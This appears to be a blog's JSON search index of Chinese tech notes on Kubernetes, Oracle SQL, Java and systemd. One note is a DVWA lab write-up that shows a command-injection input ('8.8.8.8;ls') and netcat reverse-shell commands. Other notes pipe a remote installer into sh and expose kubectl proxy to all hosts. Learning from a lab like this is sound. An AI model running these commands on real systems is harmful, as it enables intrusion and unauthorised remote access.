file: Exec format error\n\n就是安裝錯版本\n\n### 查看 cluster-info 資訊\n\n```\nkubectl cluster-info\nKubernetes control plane is running at https://192.168.99.100:8443\nKubeDNS is running at https://192.168.99.100:8443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy\n```\n\n成功完成\n\n### 刪除 minikube\n\nDelete minikube\n\nminikube delete && rm -rf ~/.minikube\n\n### 遠端連 dashboard\n\n#### 安裝 UI\n\n以下參考: \n[kubernetes/dashboard: General-purpose web UI for Kubernetes clusters](https://github.com/kubernetes/dashboard)\n[[Day 14] Kubernetes Dashboard 介紹 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10195385)\n\n\n```sh\nkubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.1.0/aio/deploy/recommended.yaml\n\nnamespace/kubernetes-dashboard configured\nserviceaccount/kubernetes-dashboard configured\nservice/kubernetes-dashboard configured\nsecret/kubernetes-dashboard-certs configured\nsecret/kubernetes-dashboard-csrf configured\nsecret/kubernetes-dashboard-key-holder configured\nconfigmap/kubernetes-dashboard-settings configured\nrole.rbac.authorization.k8s.io/kubernetes-dashboard configured\nclusterrole.rbac.authorization.k8s.io/kubernetes-dashboard configured\nrolebinding.rbac.authorization.k8s.io/kubernetes-dashboard configured\ndeployment.apps/kubernetes-dashboard configured\nservice/dashboard-metrics-scraper configured\ndeployment.apps/dashboard-metrics-scraper configured\n# 會遇到這個錯誤\nThe ClusterRoleBinding \"kubernetes-dashboard\" is invalid: roleRef: Invalid value: rbac.RoleRef{APIGroup:\"rbac.authorization.k8s.io\", Kind:\"ClusterRole\", Name:\"kubernetes-dashboard\"}: cannot change roleRef\n```\n\n這個錯誤，我目前無解...\n因為刪除 kubernetes-dashboard 後會馬上跳出來\n\n```sh\n$ kubectl proxy\n# 預設 localhost\n# Starting to serve on 127.0.0.1:8001\nkubectl proxy --address='0.0.0.0' --port=8002 --accept-hosts='^*$'\n# 開啟遠端連線\n```\n\n其他資源:[kubernetes-dashboard(1.8.3)部署与踩坑 - 雨夜朦胧 - 博客园](https://www.cnblogs.com/rainingnight/p/deploying-k8s-dashboard-ui.html)\n\n### 簡單 Hello World\n\n[Hello Minikube | Kubernetes](https://kubernetes.io/docs/tutorials/hello-minikube/)\n\n## Kind \n\n### 安裝 Docker\n\n```\ncurl -sSL https://get.daocloud.io/docker | sh\n```\n詳細建議官網看新教學\n\n\n#### 設定 docker 權限\n\n```bash\nsudo usermod -G docker -a testuser\n```\n\n做完重新登錄\n\n### 安裝 Kind\n\n```\ncurl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.9.0/kind-linux-amd64\nchmod +x ./kind\nmv ./kind /usr/local/bin/kind\n```\n\n### 啟用集群\n\n```\nkind create cluster\n```\n\n### 刪除集群\n\n```\nkind delete cluster\n```\n\n這邊要注意一點\n移除集群預設選擇設定會拿掉\n所以要重新選擇 k8s config context\n\n```sh\n# 查看現有選擇 k8s 環境\nkubectl config current-context\n# 列出所有環境\nkubectl config get-contexts\n# 選擇 k8s 環境\nkubectl config use-context minikube\n```\n更多詳細設定請參考[Day 8 - 與 k8s 溝通: kubectl - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10193502)\n外來可能會針對設定檔做設定\n\n這樣兩個環境就建置出來\n\n相關教學:\n[kind – Quick Start](https://kind.sigs.k8s.io/docs/user/quick-start) \n\n[使用 kind 快速搭建 kubernetes 环境 - WeihanLi - 博客园](https://www.cnblogs.com/weihanli/p/12831225.html)\n[使用 Kind 在 5 分钟内快速部署一个 Kubernetes 高可用集群 - 奇妙的 Linux 世界](https://www.hi-linux.com/posts/42332.html)\n[快速搭建kubernetes与kubeSphere环境（亲测有效）](https://juejin.cn/post/6844903991499833358)\n\n[【容器架构】Minikube vs.kind vs.k3s-我应该用哪一个？ | 架构师智库](http://jiagoushi.pro/minikube-vs-kind-vs-k3s-what-should-i-use)\n\n[不同Kubernetes构建工具的介绍 - 知乎](https://zhuanlan.zhihu.com/p/117558052)\n\n[使用 WSL 2 與 Docker Desktop 架設 Kubernetes 多節點叢集環境 (KinD) | The Will Will Web](https://blog.miniasp.com/post/2020/08/21/Install-Kubernetes-cluster-in-WSL-2-Docker-on-Windows-using-kind)\n","tags":["kubernetes"],"categories":["Kubernetes"]},{"title":"Oracle WHERE IN 條件塞入超過 500 筆查詢條件方法","url":"%2Fblog%2F2021%2F01%2F12%2FOracle-WHERE-IN-%E6%A2%9D%E4%BB%B6%E5%A1%9E%E5%85%A5%E8%B6%85%E9%81%8E-500-%E7%AD%86%E6%9F%A5%E8%A9%A2%E6%A2%9D%E4%BB%B6%E6%96%B9%E6%B3%95%2F","content":"\n最近維運有時有超過 500 筆資料\n需要在 SQL 指令區查詢\n但是把多千筆資料拆開也是很耗時\n[以固定行數切割文字檔案方法 | 程式狂想筆記](https://malagege.github.io/blog/2018/04/20/%E4%BB%A5%E5%9B%BA%E5%AE%9A%E8%A1%8C%E6%95%B8%E5%88%87%E5%89%B2%E6%96%87%E5%AD%97%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/)\n先前有研究這個方法，可以快速切分\n但直接查詢全部還是最快\n\n<!--more-->\n\n\n## 暫存表\n\n- [昭佑.天翔: Oracle DB 中, 建立 Temporary Table](https://tomkuo139.blogspot.com/2009/12/oracle-db-temporary-table.html)\n- [Oracle Temp Table 應用 @ Chuck Oracle Engineer :: 痞客邦 ::](https://roye0310.pixnet.net/blog/post/69218052)\n\n正式環境無法使用\n\n## 神奇大法\n\n\n```sql\nwith t as \n(\n    select (column_value).getnumberval() Codes from xmltable('1,2,3,4,5')\n)\nSELECT * FROM t\nWHERE NOT EXISTS (SELECT 1 FROM M_ITEMS M WHERE codes = M.ITEM_CODE);\n```\n和\n```sql\nwith t as \n(\n    select (column_value).getstringval() Codes from xmltable('\"A\",\"B\",\"C\"')\n)\nSELECT * FROM t\nWHERE NOT EXISTS (SELECT 1 FROM M_ITEMS M WHERE codes = M.ITEM_CODE);\n```\n\n\n主要重點是 `select (column_value).getnumberval() Codes from xmltable('1,2,3,4,5')`\n\n參考: [sql - Oracle- create a temporary resultset for use in a query - Stack Overflow](https://stackoverflow.com/questions/12169842/oracle-create-a-temporary-resultset-for-use-in-a-query)\n\n\n2021-03-13\n## Oracle IN 可放超過1000查詢條件方法\n\n雖然要手動組\n\n```sql= \nselect * from table where (1,ID)  in ( (1,0001),(1,0002)... (1,1999) )\n```\n\n參考:[oracle 1000 in clause limit @ 阿朗的部落格 :: 痞客邦 ::](https://copsonliu.pixnet.net/blog/post/92688453-oracle-1000-in-clause-limit)\n","tags":["oracle"],"categories":["Oracle"]},{"title":"WinSCP 用 sudo 上傳檔案的方法","url":"%2Fblog%2F2021%2F01%2F10%2FWinSCP-%E7%94%A8-sudo-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88%E7%9A%84%E6%96%B9%E6%B3%95%2F","content":"\n用了這麼久都不知道\n記錄一下\n\n<!--more-->\n\n請到裡面文章查看流程\n[Harry 程式筆記: [WinSCP] sftp下使用sudo上傳檔案](https://harry-lin.blogspot.com/2019/05/winscp-sftpsudo.html) {% asset_link web1.png 備份圖 %}\n\n\n想進去root 再切換 SVP ...\n結果不能切換成功\n\n或使用 [Linux創建用戶後，切換用戶報This account is currently not available_wangmm0218的博客-CSDN博客](https://blog.csdn.net/wangmuming/article/details/41575873)\n\n\n## 切換 group \n\n\n[Set effective/primary group of login? :: Support Forum :: WinSCP](https://winscp.net/forum/viewtopic.php?t=11761)\n\n使用 `newgrp <group>`(尚未測試)","tags":["winscp"],"categories":["Linux"]},{"title":"中文姓名遮罩和判斷字串有中英文方法","url":"%2Fblog%2F2021%2F01%2F07%2F%E4%B8%AD%E6%96%87%E5%A7%93%E5%90%8D%E9%81%AE%E7%BD%A9%E5%92%8C%E5%88%A4%E6%96%B7%E5%AD%97%E4%B8%B2%E6%9C%89%E4%B8%AD%E8%8B%B1%E6%96%87%E6%96%B9%E6%B3%95%2F","content":"\n網路收集幾個方法\n\n<!--more-->\n\n## 判斷中英文方法\n\n[判断字符串是否纯中文、英文、数字、等等_心丨悦 的专栏-CSDN博客](https://blog.csdn.net/qinyuezhan/article/details/82995968)\n\n```java\npublic void isEnglish(String str) {\n    //【全为英文】返回true  否则false\n    boolean result1 = str.matches(\"[a-zA-Z]+\");\n    //【全为数字】返回true\n    boolean result6 = str.matches(\"[0-9]+\");\n    //【除英文和数字外无其他字符(只有英文数字的字符串)】返回true 否则false\n    boolean result2 = str.matches(\"[a-zA-Z0-9]+\");\n    //【含有英文】true\n    String regex1 = \".*[a-zA-z].*\";\n    boolean result3 = str.matches(regex1);\n    //【含有数字】true\n    String regex2 = \".*[0-9].*\";\n    boolean result4 = str.matches(regex2);\n    //判断是否为纯中文，不是返回false\n    String regex3 = \"[\\\\u4e00-\\\\u9fa5]+\";\n    boolean result5 = str.matches(regex3);\n    System.out.println(result1 + \"--\" + result2 + \"--\" + result3\n            + \"--\" + result4 + \"--\" + result5 + \"--\" + result6);\n}\n```\n\n\n## 中英文姓名判斷\n\n```java\npublic class HelloWorld{\n    public static void main(String[] args) {\n\n        String id = \"A123456789\";\n\n        System.out.println(maskName(\"黃藥師\")); // A1*****789\n        System.out.println(maskName(\"Hello World\")); // A1234*****\n        System.out.println(maskName(\"Huang d\")); // ####456789\n\n    }\n\n\n    public static String maskName(String name){\n\n        String result = \"\";\n        if (isEnglish(name)) {\n            result = mask(name, 2, name.length()-3, '*');\n        }else{\n            result = mask(name, 1, name.length()-2, '*');\n        }\n        return result;\n    }\n\n     //判断是不是英文字母\n     public static boolean isEnglish(String charaString) {\n         if( charaString == null && \"\".equals(charaString)){\n             return false;\n         }\n      return charaString.substring(0,1).matches(\"^[a-zA-Z]*\");\n     }\n    /**\n     * 字串遮罩\n     * @param text 原始字串\n     * @param start 遮罩起始位置index\n     * @param length 遮罩長度\n     * @param maskSymbol 遮罩符號\n     * @return 遮罩過的字串\n     */\n    private static String mask(String text, int start, int length, char maskSymbol) {\n        if (text == null || text.isEmpty()) {\n            return \"\";\n        }\n        if (start < 0) {\n            start = 0;\n        }\n        if (length < 1) {\n            return text;\n        }\n\n        StringBuilder sb = new StringBuilder();\n        char[] cc = text.toCharArray();\n        for (int i = 0; i < cc.length; i++) {\n            if (i >= start && i < (start + length)) {\n                sb.append(maskSymbol);\n            } else {\n                sb.append(cc[i]);\n            }\n        }\n        return sb.toString();\n    }\n}\n```\n\n遮罩長度可以改\n\n```java\n    public static String maskName(String name){\n\n        String result = \"\";\n        if (isEnglish(name)) {\n            result = mask(name, 2, name.length()-3 > 8 ? 8 : name.length()-3 , '*');\n        }else{\n            result = mask(name, 1, name.length()-2 > 8 ? 8 : name.length()-2 , 'o');\n        }\n        return result;\n    }\n```\n\n### sql 判斷方法\n\n[oracle 判断字符是否为字母，oracle字符_数据库前沿资讯 | 和通数据库](http://www.htsjk.com/shujukunews/3544.html)\n[How to mask characters with X in a varchar2 field in Oracle SQL - Stack Overflow](https://stackoverflow.com/questions/19046824/how-to-mask-characters-with-x-in-a-varchar2-field-in-oracle-sql)\n\n```sql\n--- postgressql\nselect substr(a.name,1,2)|| repeat('*',length(a.name)-2)|| substr(a.name,length(a.name)-1,2),a.name,ascii(substring(a.name,1,1)) between 65 and 122,\nCASE WHEN ascii(substring(a.name,1,1)) between 65 and 122 then \n substr(a.name,1,2)|| repeat('*',length(a.name)-3)|| substr(a.name,-1,1)\nelse \n substr(a.name,1,1)|| repeat('*',length(a.name)-2)|| substr(a.name,-1,1)\nend as mask_name,length(a.name)\nfrom account  a\n```\n\n```sql\n\n--oracle\n        select substr(full_name,1,5) || regexp_replace(substr(full_name,6,5), '[^ ]', 'X') ||\n       substr(full_name,11,5) || regexp_replace(substr(full_name,16,5), '[^ ]', 'X') ||\n       substr(full_name,21,5) || regexp_replace(substr(full_name,26,5), '[^ ]', 'X') as masked_name\nfrom\n(  \n  select 'Tristram Vladimir Chan ' as full_name from dual\n)\n```","tags":["java"],"categories":["Java"]},{"title":"Java 實作 Memory Cache 方法小記","url":"%2Fblog%2F2021%2F01%2F07%2FJava-%E5%AF%A6%E4%BD%9C-Memory-Cache-%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98%2F","content":"\n最近程式會頻繁撈取資料庫\n想有沒有減輕資料庫負擔\n後來想到之前 swoole 課程有提到 Memory Cache\n今天網路找了一下 Java 實作\n發現還滿多實作可以直接使用\n\n<!--more-->\n\n1. CachesExplained\n\n- [CachesExplained · google/guava Wiki · GitHub](https://github.com/google/guava/wiki/CachesExplained)\n- [[Google Guava] 3-缓存 | 并发编程网 – ifeve.com](http://ifeve.com/google-guava-cachesexplained/)\n- [HashMap? ConcurrentHashMap? 相信看完这篇没人能难住你！ | crossoverJie's Blog](https://crossoverjie.top/2018/07/23/java-senior/ConcurrentHashMap/)\n\n2. [GitHub - lixk/ECache: simple memory cache for Java](https://github.com/lixk/ECache)\n\n簡單實用，我是使用這個範例實作\n就專案能用\n\n```java\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.ScheduledExecutorService;\nimport java.util.concurrent.TimeUnit;\n\n/**\n * simple memory cache\n *\n * @author lixk\n */\npublic class ECache {\n\t/**\n\t * key-value data set\n\t */\n\tprivate final static Map<String, Entity> DATA_BASE = new HashMap<>();\n\t/**\n\t * use scheduled executor to clean expired data\n\t */\n\tprivate final static ScheduledExecutorService CLEANER = Executors.newSingleThreadScheduledExecutor();\n\n\t/**\n\t * put data to cache\n\t *\n\t * @param key   unique identification for data\n\t * @param value your data\n\t */\n\tpublic synchronized static void put(String key, Object value) {\n\t\tECache.put(key, value, 0L);\n\t}\n\n\t/**\n\t * put data to cache\n\t *\n\t * @param key    unique identification for data\n\t * @param value  your data\n\t * @param expire data survival time in milliseconds\n\t */\n\tpublic synchronized static void put(final String key, final Object value, final long expire) {\n\t\t//clean old data\n\t\tECache.remove(key);\n\t\t//set schedule task\n\t\tif (expire > 0L) {\n\t\t\tFuture future = CLEANER.schedule(new Runnable() {\n\t\t\t\t@Override\n\t\t\t\tpublic void run() {\n\t\t\t\t\t//remove data\n\t\t\t\t\tsynchronized (ECache.class) {\n\t\t\t\t\t\tDATA_BASE.remove(key);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}, expire, TimeUnit.MILLISECONDS);\n\t\t\tDATA_BASE.put(key, new Entity(value, expire, future));\n\t\t} else {\n\t\t\tDATA_BASE.put(key, new Entity(value, null, null));\n\t\t}\n\t}\n\n\t/**\n\t * read data from cache\n\t *\n\t * @param key unique identification for data\n\t * @return data bound to the key\n\t */\n\tpublic synchronized static <T> T get(String key) {\n\t\tEntity entity = DATA_BASE.get(key);\n\t\tif (entity != null && entity.isAlive()) {\n\t\t\treturn (T) entity.value;\n\t\t}\n\t\treturn null;\n\t}\n\n\t/**\n\t * remove cached data\n\t *\n\t * @param key unique identification for data\n\t * @return data bound to the key\n\t */\n\tpublic synchronized static <T> T remove(String key) {\n\t\t//remove data from data set\n\t\tEntity entity = DATA_BASE.remove(key);\n\t\tif (entity == null) {\n\t\t\treturn null;\n\t\t}\n\t\t//cancel the schedule task\n\t\tif (entity.future != null) {\n\t\t\tentity.future.cancel(true);\n\t\t}\n\n\t\treturn entity.isAlive() ? (T) entity.value : null;\n\t}\n\n\t/**\n\t * cached data entity\n\t */\n\tprivate static class Entity {\n\t\tObject value;\n\t\tLong expirationTime;\n\t\tFuture future;\n\n\t\tEntity(Object value, Long expire, Future future) {\n\t\t\tthis.value = value;\n\t\t\tthis.expirationTime = (expire == null ? null : System.currentTimeMillis() + expire);\n\t\t\tthis.future = future;\n\t\t}\n\n\t\t/**\n\t\t * Judging whether the entity is still alive\n\t\t *\n\t\t * @return boolean\n\t\t */\n\t\tboolean isAlive() {\n\t\t\treturn this.expirationTime == null || this.expirationTime >= System.currentTimeMillis();\n\t\t}\n\t}\n}\n\n\n```\n\n3. [Java in Memory Cache – Geekout – From one propeller head to another!](http://hulen.com/java-in-memory-cache/)\n\n- [利用LRUMap 设计缓存 - mingziday - 博客园](https://www.cnblogs.com/mingziday/p/4910004.html)\n\n\n彩蛋:\n\n[什么是 istio | Cizixs Write Here](https://cizixs.com/2018/08/26/what-is-istio/)\n[【技术教程】利用User-agent-utils获取用户浏览器、操作系统等信息 - 数字人文技术实验室](http://lab1.liulichao.com/2016/08/15/user-agent-utils.html)\n[新一代的微服务架构 Service Mesh - SegmentFault 思否](https://segmentfault.com/a/1190000023011928)\n[GitHub - qiao-zhi/Spring-Struts-Mybaits-Shiro: Spring+Struts2+Mybatis+Shiro的权限管理](https://github.com/qiao-zhi/Spring-Struts-Mybaits-Shiro)","tags":["java"],"categories":["Java"]},{"title":"JVM 查看記憶體使用情況方法","url":"%2Fblog%2F2021%2F01%2F04%2FJVM-%E6%9F%A5%E7%9C%8B%E8%A8%98%E6%86%B6%E9%AB%94%E4%BD%BF%E7%94%A8%E6%83%85%E6%B3%81%E6%96%B9%E6%B3%95%2F","content":"\n\n\n<!--more-->\n\n## 使用清單\n\n```bash\n#  檢視當前機器上所有執行的java程序名稱與pid(程序編號)\njps -l\n#  顯示指定的jvm程序所有的屬性設定和配置引數\njinfo pid\n```\n\nTODO: 整理\n\n[利用jmap和MAT等工具查看JVM运行时堆内存 - osc_3wmngxzc的个人空间 - OSCHINA - 中文开源技术交流社区](https://my.oschina.net/u/4416802/blog/3845052)\n[JVM 記憶體溢出 - 夜升筆談](https://blog.yosheng.tw/jvm-out-of-memory)\n\n[JVM故障分析及性能优化实战(VII)——使用MAT的Histogram和Dominator Tree定位溢出源 - 云+社区 - 腾讯云](https://cloud.tencent.com/developer/article/1518274)\n\n[JVM(完成度95%,不斷更新) - ⎝⎛CodingNote.cc ⎞⎠](https://codingnote.cc/zh-tw/p/152324/)\n\n[JVM引數對J2EE效能優化的影響 - IT閱讀](https://www.itread01.com/p/580598.html)","tags":["jvm"],"categories":["Java"]},{"title":"springframework3 with struts2 使用 swagger 工具注解使用","url":"%2Fblog%2F2021%2F01%2F04%2Fspringframework3-with-struts2-%E4%BD%BF%E7%94%A8-swagger-%E5%B7%A5%E5%85%B7%E6%B3%A8%E8%A7%A3%E4%BD%BF%E7%94%A8%2F","content":"\n搭在 spring 3 網路上很多教學都是使用 spring MVC 去做串接\n由於公司上使用是舊版\n所以找找有沒有能用的方法\n最後成功來記錄一下\n\n<!--more-->\n\n## 下載依賴\n\n```xml\n<dependency>\n    <groupId>io.swagger</groupId>\n    <artifactId>swagger-jersey2-jaxrs</artifactId> \n    <version>1.5.0</version>\n</dependency>\n```\n\n由於我專案沒有用 maven\n所以...自己想辦法抓\n\n```\nmvn dependency:get -DgroupId=io.swagger -DartifactId=swagger-jersey2-jaxrs -Dversion=1.6.2 -Ddest=/mnt/d/mvntest\n```\n\n參考:[How to simply download a JAR using Maven? - Stack Overflow](https://stackoverflow.com/questions/7110114/how-to-simply-download-a-jar-using-maven)\n\n但後來發現還是不比[Maven 建置專案初體驗 | 程式狂想筆記](https://malagege.github.io/blog/2020/06/15/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/#%E4%B8%80%E7%A8%AE%E5%BF%AB%E9%80%9F%E8%BC%B8%E5%85%A5%E5%BB%BA%E7%BD%AE%E6%96%B9%E6%B3%95)設定好 pom.xml 在執行`mvn dependency:copy-dependencies`快速\n\n\n\n## 配製 swagger(web.xml)\n\n以下參照[Jersey整合Swagger自动生成API文档](https://blog.devzeng.com/blog/jersey-swagger-api.html)\n\n1. 可依照源專案 servlet 還是filter 做調整\n\n```xml \n<!-- servlet 設定-->\n<!-- jersey -->\n<servlet>\n    <servlet-name>jersey</servlet-name>\n    <servlet-class>org.glassfish.jersey.servlet.ServletContainer</servlet-class>\n    <init-param>\n        <param-name>jersey.config.server.provider.packages</param-name>\n        <param-value>io.swagger.jaxrs.listing,com.devzeng.service.schedule.api</param-value>\n    </init-param>\n    <load-on-startup>1</load-on-startup>\n</servlet>\n<servlet-mapping>\n    <servlet-name>jersey</servlet-name>\n    <url-pattern>/api/*</url-pattern>\n</servlet-mapping>\n```\n\n2. 新增swagger配置\n\n```xml\n<!-- swagger -->\n<servlet>\n    <servlet-name>Jersey2Config</servlet-name>\n    <servlet-class>io.swagger.jersey.config.JerseyJaxrsConfig</servlet-class>\n    <init-param>\n        <param-name>api.version</param-name>\n        <param-value>1.0.0</param-value>\n    </init-param>\n    <init-param>\n        <param-name>swagger.api.basepath</param-name>\n        <param-value>http://localhost:8080/api</param-value>\n    </init-param>\n    <load-on-startup>2</load-on-startup>\n</servlet>\n```\n\n說明：\n\n    swagger.api.basepath:這個是api訪問的baseurl\n\n\n## 配置前端 swagger UI\n\n```bash\ngit clone  https://github.com/swagger-api/swagger-ui.git\ngit checkout 2.x # 由於版本過舊，建議使用這個版本\n```\n\n> 4、配置swagger-ui\n> (1) 下載swagger-ui\n> \n> https://github.com/swagger-api/swagger-ui\n> \n> 推薦使用2.x版本\n> (2) 拷貝dist目錄下面的文件到webroot下面\n> (3) 修改index.html頁面的url地址\n> \n> url = \"http://localhost:8080/api/swagger.json\";\n\n\n## 其他文章\n\n[Documenting RESTful Java Web Services using Swagger](https://hub.packtpub.com/restful-java-web-services-swagger/)\n\n[1: Spring Boot 使用JSONDoc快速生成Restful API - 简书](https://www.jianshu.com/p/291217345e5d)\n","categories":["Java"]},{"title":"Oracle 使用 listagg 多列群組合成同一列方法","url":"%2Fblog%2F2020%2F12%2F24%2FOracle-%E4%BD%BF%E7%94%A8-listagg-%E5%A4%9A%E5%88%97%E7%BE%A4%E7%B5%84%E5%90%88%E6%88%90%E5%90%8C%E4%B8%80%E5%88%97%E6%96%B9%E6%B3%95%2F","content":"\n之前有在 MySQL 用過這個需求用過這個需求[GROUP_CONCAT 和 CONCAT_WS 多個橫欄和縱欄組在一起方法 | 程式狂想筆記](https://malagege.github.io/blog/2019/09/02/group-cancat-%E5%92%8C-concat-ws-%E5%A4%9A%E5%80%8B%E6%A9%AB%E6%AC%84%E5%92%8C%E7%B8%B1%E6%AC%84%E7%B5%84%E5%9C%A8%E4%B8%80%E8%B5%B7%E6%96%B9%E6%B3%95/)\n但是 Oracle 用上有差異\n還多了一堆限制(如:字數不能超過 4000)\ndistinct 還會被禁用??!\n\n<!--more-->\n\n## Distinct\n\n1. [Oracle listagg去重distinct三種方法總結_weixiaohuai的博客-CSDN博客](https://blog.csdn.net/Weixiaohuai/article/details/84998212)\n2. [Remove Duplicates From Comma Separated String — oracle-tech](https://community.oracle.com/tech/developers/discussion/2499711/remove-duplicates-from-comma-separated-string)\n\n```sql\n-- 此方法需要排序後才有過濾重複效果\nselect REGEXP_REPLACE('5,5,5,5,6,6,5,5,5,6,7,4,1,2,1,4,7,2', '(^|,)([^,]*)(,\\2)+','\\1\\2') from dual;\n---------------------------------\n5,6,5,6,7,4,1,2,1,4,7,2\n```\n\n## 字數過長\n\n```sql\nSQL> select rtrim(xmlagg(xmlelement(e,id,',').extract('//text()') order by id).GetClobVal(),',')\n   from (select level as id from dual connect by level < 1050)\n  /\n\nRTRIM(XMLAGG(XMLELEMENT(E,ID,',').EXTRACT('//TEXT()')ORDERBYID).GETCLOBVAL(),','\n--------------------------------------------------------------------------------\n1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18...\n```\n\n1. [ora-01489 字符串連接的結果過長 解決方案 - iUpoint - 博客園](https://www.cnblogs.com/iupoint/p/10974864.html)\n2. [Oracle LISTAGG 長度大於 4000 解決方案 | lizhen's blog](https://lz5z.com/Oracle%20LISTAGG%E9%95%BF%E5%BA%A6%E5%A4%A7%E4%BA%8E4000%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/)\n\n但這個沒有排序...\n\n## 逗號排序\n\n[Sort delimited separated values in a string with (Oracle) SQL - Stack Overflow](https://stackoverflow.com/questions/7808325/sort-delimited-separated-values-in-a-string-with-oracle-sql)\n\n```sql\nselect listagg(somedata, '|') within group (order by somedata) somedata from (\nwith q as (select '|'||'9|2|6|7|5' as somedata from dual)\nselect substr(somedata, instr(somedata, '|', 1, rownum) + 1, 1) somedata\n  from q,\n   (select 1 from q connect by level <= length(regexp_replace(somedata, '[0-9]', '')))\n)\n\n```\n但這個跟 xmlagg 結合會有問題\n都會跑出 null\n\n\n先記錄到這邊","tags":["oracle"],"categories":["SQL"]},{"title":"Command Injection 小記","url":"%2Fblog%2F2020%2F12%2F07%2FCommand-Injection-%E5%B0%8F%E8%A8%98%2F","content":"\ncommand injection \n\n平常沒什麼看過\n今天程式做弱點掃描發現這個問題\n程式call web service 掃出弱點\n等等web service 怎麼掃出 command injection ，改不會是誤判了\n本片重點在 command injection\n\n<!--more-->\n\n- [Metasploitable 學習筆記-DVWA Command injection 命令注入攻擊與 Reverse Shell | by Kuro Huang | 資安工作者的學習之路 | Medium](https://medium.com/blacksecurity/metasploitable-dvwa-command-injection-9c092e180d0)\n\n裡面談到 reverse shell 也滿有趣的，本篇用 dvwa 試跑一次\n\n- [資安這條路 07 - [Injection] Command injection - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10242080)\n- [那個夜裡的資安-22(Reverse Shell) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10221819)\n\n\n\n## 安裝 dvwa\n\n參考:\n- [新手指南：DVWA-1.9全级别教程（完结篇，附实例）之XSS - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/123779.html)\n- [新手指南：手把手教你如何搭建自己的渗透测试环境 - FreeBuf网络安全行业门户](https://www.freebuf.com/sectool/102661.html)\n\n這邊使用 docker 安裝 dvwa\n\n```bash\ndocker run --rm -it -p 80:80 vulnerables/web-dvwa\n```\n\n用在那一台(docker)，使用 localhost 才連的到\n使用`http://localhost/setup.php`\n\n按下去`Create / Reset database` 按鈕，會自動跳回登入頁面\n\n>    Username: admin\n>    Password: password\n\n## Command injection\n\n進到左邊的`Command injection`\n輸入欄位`8.8.8.8;ls`做查詢，這樣就能看到 ls 也能被執行\n\n\n## reverse shell (失敗)\n\n### docker 測試環境沒有 netcat\n\ndocker 安裝 \n\n```bash\ndocker exec -it 63 bash\n# 63 試 container ID\napt update\napt install -y netcat \n```\n\n得知測試環境 docker ip\n\n```\ndocker inspect 63 | grep IP \n```\n\n```\n            \"LinkLocalIPv6Address\": \"\",\n            \"LinkLocalIPv6PrefixLen\": 0,\n            \"SecondaryIPAddresses\": null,\n            \"SecondaryIPv6Addresses\": null,\n            \"GlobalIPv6Address\": \"\",\n            \"GlobalIPv6PrefixLen\": 0,\n            \"IPAddress\": \"172.17.0.2\",\n            \"IPPrefixLen\": 16,\n            \"IPv6Gateway\": \"\",\n                    \"IPAMConfig\": null,\n                    \"IPAddress\": \"172.17.0.2\",\n                    \"IPPrefixLen\": 16,\n                    \"IPv6Gateway\": \"\",\n                    \"GlobalIPv6Address\": \"\",\n                    \"GlobalIPv6PrefixLen\": 0,\n```\n\n這邊我們看到 docker IP 為 `172.17.0.2`\n不過這邊需要讓 docker 連我的本機 IP ，如: `192.168.1.1`\n\n- [socat 實用網路工具 和 使用解析 unix socket 方法 | 程式狂想筆記](https://malagege.github.io/blog/2020/02/14/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/)\n\n\nnc 環境在docker 環境無法使用...\n有空再研究，睡覺\n\n\n    在Kali執行nc -vv -l -p 8080\n    在網頁執行nc -e /bin/sh [ip] 8080\n    執行指令\n\n有空來測試[Vagrant box mmckinst/dvwa - Vagrant Cloud](https://app.vagrantup.com/mmckinst/boxes/dvwa)\n\n## \n","categories":["Linux"]},{"title":"Systemd 時間排程筆記","url":"%2Fblog%2F2020%2F12%2F07%2FSystemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98%2F","content":"\n\n\n一般我們使用排程都是用 crontab\n再搭配使用flock 去做程式執行管控，這一段也有可能時間寫死程式一個flag，這無疑是要佔用檔案了\n前幾天我看到 systemd 可以做排程設定\n所以就簡單研究一下\n\n其實之前就有簡單研究\n一直覺得這個東西非常實用\n用配置就能完成程式複雜判斷\n\n網路上還滿多相關教學\n應該可以用在正式環境上面\n\n<!--more-->\n\n## 了解工具名稱\n\nSystemd 雖然指令叫 `systemctl`，但網路上看到都叫 systemd。\n\n> 查看和控制systemd的主要命令是systemctl。該命令可用查看系統狀態和管理系統及服務。詳見systemctl(1)。 \n\n參考: [systemd (正體中文) - ArchWiki](https://wiki.archlinux.org/index.php/Systemd_(%E6%AD%A3%E9%AB%94%E4%B8%AD%E6%96%87))\n\n\n## 簡單使用\n\n之前[rclone 掛載硬碟小記 | 程式狂想筆記](https://malagege.github.io/blog/2019/10/14/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/#%E8%87%AA%E5%8B%95%E6%8E%9B%E8%BC%89)有簡單用過\n\n後面記得要加`sudo systemctl daemon-reload`\n後面記得要加`sudo systemctl daemon-reload`\n後面記得要加`sudo systemctl daemon-reload`\n\n因為很重要，所以講三遍!!!\n一不注意就忘記了XD\n\n### 一般 root 使用小記\n\n.target\n### UNIT,Service,Install\n\n> [Unit] 小節選項\n\n> 單元文件中的 [Unit] 小節 包含與單元類型無關的通用信息。 